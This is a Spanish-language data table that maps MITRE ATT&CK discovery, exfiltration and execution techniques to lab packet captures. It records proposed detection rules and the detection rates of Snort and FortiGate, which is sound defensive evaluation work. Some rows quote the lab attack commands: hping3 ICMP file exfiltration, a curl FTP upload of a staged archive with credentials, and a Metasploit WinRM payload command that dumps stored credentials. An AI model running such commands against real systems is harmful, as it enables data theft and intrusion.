Discovery;-;TA0007;Network Service Discovery;T1046;-;-;Descubrimiento de servicios y version;Nikto;T1046-Version_services_detection1_[3].pcapng;;6270;0;SI;"""Múltiples mecanismos. Por ejemplo, regla que detecte un escaneo de puertos (alto número de peticiones hacia un rango de puertos en poco tiempo)""";-;Manual [3] / 3.8.3;Manual [3] / 3.8.3.4;Manual [3] / 3.8.3.5;1;1;0;1;0;1;0;0.00;48;0.01;48;0.01;73;0.01;"""Existen 6270 rutas diferentes en el escaneo de rutas. Es decir, 6270 mensajes HTTP GET. Snort detecta el uso de Nikto para el escaneo web y detecta el acceso a diferentes rutas y intentos de diferentes ataques (Ejemplo SID 2009325) que no se corresponden con el ataque realizado. En FortiGate hay que descartar las alertas relacionadas con la herramienta usada, por lo que detectan 208 instancias de ataque""";208;0.03;1
Discovery;-;TA0007;Network Service Discovery;T1046;-;-;Descubrimiento de servicios y version;nmap;T1046-Version_services_detection2_[3].pcapng;;65536;0;SI;"""Múltiples mecanismos. Por ejemplo, regla que detecte un escaneo de puertos (alto número de peticiones hacia un rango de puertos en poco tiempo)""";-;Manual [3] / 3.8.3;Manual [3] / 3.8.3.4;Manual [3] / 3.8.3.5;1;1;0;1;0;0;3;0.00;49;0.00;49;0.00;51;0.00;"""Se realiza un escaneo completo de puertos. Snort detecta el escaneo de puertos mediante los SID 2009358 detectando el uso de nmap. Además, detecta el escaneo de diferentes rangos de puertos como el SID 2002910. FortiGate sólo detecta el descubrimiento de puertos relacionados con el servicio HTTP""";4;0.00;1
Discovery;-;TA0007;Network Service Discovery;T1046;-;-;DDos + Escaneo de puertos;"""Low Orbit Ion Canon (LOIC) for UDP, TCP, or HTTP requests""";T1046-C2018_[6].pcapng;;1;0;NO**;"""En determinadas circunstancias, si el envío de paquetes constituye una amenaza de denegación de servicio, podría detectarse el envío masivo de paquetes""";-;Dataset CIC-2018;Manual [4] / B.31;Dataset CIC-2018;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;1;1.00;-;1;1.00;1
Discovery;-;TA0007;Remote System Discovery;T1018;-;-;Descubrimiento de servicios y puertos;nmap;T1018-service_discovery_[3].pcapng;;1000;0;SI;Regla que detecte envío de mútliples peticiones a un rango de puertos en un tiempo determinado;-;Manual [3] / 3.8.1;Manual [3] / 3.8.1.4;Manual [3] / 3.8.1.5;1;1;0;1;0;1;0;0.00;44;0.04;44;0.04;44;0.04;"""En este ataque se realiza el escaneo de 1000 puertos. Sin embargo, no se detecta el uso de nmap y solo se detectan los rangos de puertos 5900-5920 y 5800-5820 (SIDS 2002911 2002910) y los puertos 3306,1433,1521,5432. FortiGate sólo detecta este ataque para 6 puertos concretos""";6;0.01;1
Discovery;-;TA0007;Group Policy Discovery;T1615;-;-;Comandos mediante Powershell para obtener información sobre configuraciones de políticas de grupo;PowerShell;T1615-Group_Policy_Discovery_[5].pcapng;;41;0;NO;Detección por anomalías;Ejecución de comandos mediante Powershell para comprobar políticas de grupo;Manual [5] / 3.5.6.1;Manual [5];;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;Misma consulta realizada muchas veces repetida;0;0.00;0
Discovery;-;TA0007;System Owner;T1033;-;-;Descubrimiento de sesión de usuario en equipo remoto;"""quser, qwinsta""";T1033-System_owner_[4].pcapng;;1;0;SI;Regla que detecte múltiples interacciones con la API LSM_API_service del servicio RPC desde el mismo equipo origen.;-;Manual [4] / 3.12;Manual [4] / B.12;Manual [4] / 4.12;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;1
Discovery;-;TA0007;Domain Trust Discovery;T1482;-;-;Descubrimiento de dominios de confianza en entorno Active Directory;dsquery;T1482-Domain_trust_discovery_[4].pcapng;;1;0;NO*;"""Regla personalizada que detecte paquetes LDAP, procedentes de equipos que no son DC en la red (configurable manualmente) y con la cadena objectClass=trustedDomain""";-;Manual [4] / 3.13;Manual [4] / B.13;Manual [4] / 4.13;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;1
Exfiltration;-;TA0010;Exfiltration Over Alternative Protocol;T1048;Exfiltration Over Unencrypted Non-C2 Protocol;T1048.003;Exfiltración por ICMP;hping3;T1048.003-Exfiltration_over_ICMP_[2].pcapng;;16;0;SI;Regla genérica que detecte PING inusual.;"""Exfiltracion mediante protocolo ICMP. Envia varios echo Request que contienen como datos el contenido de ese fichero. Comando: echo ""Esto es un exfiltración sobre ICMP"" > file;timeout 15s hping3 --file ./file --data 36 192.168.2.2 --icmp""";Manual [2] / 3.2.2.1;Manual [4] / B.27;Manual [2] / 4.2.2.2;1;1;0;1;0;1;16;1.00;16;1.00;16;1.00;16;1.00;El mismo mensaje ICMP es enviado varias veces repetido. Snort detecta el envio inusual de PING (SID 29456);0;0.00;1
Exfiltration;-;TA0010;Exfiltration Over Alternative Protocol;T1048;Exfiltration Over Unencrypted Non-C2 Protocol;T1048.003;Exfiltración por FTP;Caldera;T1048.003-Exfiltration_over_FTP_[3].pcapng;;1;0;NO;-;"""Exfiltracion de datos utilizando el protocolo FTP. Utilizando caldera y la operacion Advanced Thief. Comando: curl -T stage_to_steal.tar.gz.gpg ftp://172.16.1.2/VictimDirectory/ --user ""dit:dit""""";Manual [3] / 3.8.15;Manual [3] / 3.8.15.4;Manual [3] / 3.8.15.5;1;1;0;1;0;0;0;0.00;0;0.00;0;0.00;1;1.00;-;0;0.00;0
Exfiltration;-;TA0010;Exfiltration Over Other Network Medium;T1011;Exfiltration Over Bluetooth;T1011.001;Extracción via Bluetooth;"""Covenant, btobex, Bluetooth""";T1011-Exfiltration_over_bluetooth_[4].pcapng;;1;0;NO;Detección por anomalías en red Bluetooth. Envío y/o recepción de información comprometida por la red Bluetooth;-;Manual [4] / 3.23;Manual [4] / B.23;Manual [4] / 4.23;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;0
Exfiltration;-;TA0010;Automated Exfiltration;T1020;Traffic Duplication;T1020.001;Ejecución de script en Python para activar el reenvío de paquetes en el equipo víctima;"""SSH, Scapy""";T1020.001-Automated_exfiltration_traffic_duplication_[4].pcapng;;1;0;NO;Detección por anomalías en red que detecte el envío duplicado de paquetes procedentes de un mismo origen interno a la organización;-;Manual [4] / 3.24;Manual [4] / B.24;Manual [4] / 4.24;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;0
Exfiltration;-;TA0010;Scheduled Transfer;T1029;-;-;Comunicación C2 para el establecimiento de extracción programada;"""Covenant, Powershell""";T1029-Scheduled_transfer_[4].pcapng;;1;1;NO;"""Detección por anomalías, basada en el descubrimiento de eventos programados que no han sido creados por el usuario.""";-;Manual [4] / 3.25;Manual [4] / B.25;Manual [4] / 4.25;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;0
Exfiltration;-;TA0010;Data Transfer Size Limits;T1030;-;-;Dividir archivos para realizar transferencias menores a un umbral que provoque alertas;"""ftp, split""";T1030-Transfer_Size_Limits_[5].pcapng;;1;0;NO**;"""Dependiendo la forma en la que se envien los archivos, puede ser indetectable. Sin embargo, si utiliza protocolos de transferencia de ficheros (FTP,SMB...) resulta importante monitorizar transferencias con un mismo tamaño de manera concurrente""";"""Transferencia de ficheros mediante FTP, previamente divididos en paquetes de un tamaño constante""";Manual [5] / 3.5.9.1;Manual [5];;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;1
Exfiltration;-;TA0010;Transfer Data to Cloud Account;T1537;-;-;Transferir archivos de una cuenta a otra mediante un servicio en la nube;OneDrive;T1537-Transfer_Data_to_Cloud_Account_[5].pcapng;;1;0;NO;Deteccion por listas negras/anomalías;Transferir entre dos cuentas en la nube unos ficheros;Manual [5] / 3.5.9.2;Manual [5];;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;0
Exfiltration;-;TA0010;Exfiltration Over C2 Channel;T1041;-;-;Exfiltración por canal C2;Caldera;T1041-exfiltration_over_c2_channel_[3].pcapng;;1;0;NO;Detección por anomalías basada en la sospecha de una extracción de información confidencial por un posible canal C2;-;Manual [3] / 3.8.14;Manual [3] / 3.8.14.4;Manual [3] / 3.8.14.5;1;1;0;1;0;0;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;0
Exfiltration;-;TA0010;Exfiltration over Web Service;T1567;Exfiltration to Cloud Storage;T1567.002;Exfiltrar datos de un equipo a la nube;Google Drive;T1567.002-Exfiltration_To_Cloud_Storage_[5].pcapng;;1;0;NO;Deteccion por listas negras/anomalías;Transferir ficheros de un equipo a la nube;Manual [5] / 3.5.9.3;Manual [5];;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;0
Execution;-;TA0002;User Execution;T1204;Malicious Link;T1204.001;Enlace malicioso;wget;T1204.001-malicious_link_[3].pcapng;;1;0;NO;Deteccion por listas negras/anomalías;Redireccion al pinchar en un enlace a un sitio malicioso. Comando : wget http://172.16.1.2 (Desde la víctima);Manual [3] / 3.8.17;Manual [3] / 3.8.17.4;Manual [3] / 3.8.17.5;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;0
Execution;-;TA0002;Windows Management Instrumentation;T1047;-;-;Ejecución de carga por WinRM;Metasploit;T1047-WinRM_[2].pcapng;;1;0;SI;Regla genérica que detecte intento de ejecucion de código shell en un equipo;"""Ejecucion de payload en un equipo mediante WinRM. Comando: msfconsole -x ""use exploit/windows/winrm/winrm_script_exec; set RHOSTS 192.168.2.2; set LHOST 192.168.1.3; set LPORT 5555; set username administrator; set password vagrant; set force_vbs true; run -z; sessions -c 'cmdkey /list'; sessions -k 1; exit""""";Manual [2] / 3.1.4.1;Manual [4] / B.26;Manual [2] / 4.2.1.5;1;1;0;1;0;1;1;1.00;1;1.00;1;1.00;1;1.00;-;0;0.00;1
Execution;-;TA0002;Exploitation for Client Execution;T1203;-;-;Ataque con Botnet;"""Ares, Screenshot and key logging""";T1203-C2018_[6].pcapng;;1;0;NO;-;-;Dataset CIC-2018;Dataset CIC-2018;Manual [4] / B.35;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;0
Execution;-;TA0002;System Services;T1569;Service Execution;T1569.002;Ejecución de un Servicio / Fichero Ejecutable de manera remota;PsExec;T1569-System_services_service_execution_[4].pcapng;;1;0;SI;"""Existen múltiples métodos de detección. Como ejemplos:
 Regla que detecte la cadena “PSEXESVC” en el contenido de mensajes SMBv2
 Regla que detecte archivos ejecutables en mensajes SMB
""";-;Manual [4] / 3.6;Manual [4] / B.6;Manual [4] / 4.6;1;1;0;1;0;1;0;0.00;1;1.00;1;1.00;1;1.00;-;0;0.00;1
